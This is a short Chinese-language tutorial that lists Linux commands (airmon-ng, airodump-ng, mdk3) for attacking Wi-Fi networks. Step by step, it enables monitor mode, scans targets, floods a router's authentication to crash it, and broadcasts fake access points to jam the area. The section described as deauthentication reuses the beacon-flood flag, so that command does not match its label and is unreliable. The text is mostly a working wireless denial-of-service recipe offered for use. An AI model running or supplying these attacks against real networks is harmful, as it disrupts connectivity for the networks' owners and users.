准备：linux安装了mdk3，不好安装可以换源试试，一个可以进入监听模式的无线网卡（我的笔记本网卡不支持，买的外置的网卡，芯片是8087或者7037）;网线（用有线网联网）

a模式（pin死路由器）

1.airmon-ng check kill //结束所有进程

2.ifconfig -a //检测网卡

3.airmon-ng start wlan1 //载入网卡,wlan1为网卡名（注：载入无线网卡后，连自己电脑的无线网卡也一起不好用了，这就是用有线网的原因）

4.airodump-ng wlan1 //信号扫描

5.sudo mdk3 wlan1 a -a mac //mac指mac地址


b模式(生成名为word里的wifi信号，起干扰作用
sudo mdk3 wlan1 b -f /root/桌面/word // /root/桌面/word 是word文件放的位置


d模式（发送断开连接请求）
sudo mdk3 wlan1 b -c 4 // 4 是频道，可以多选
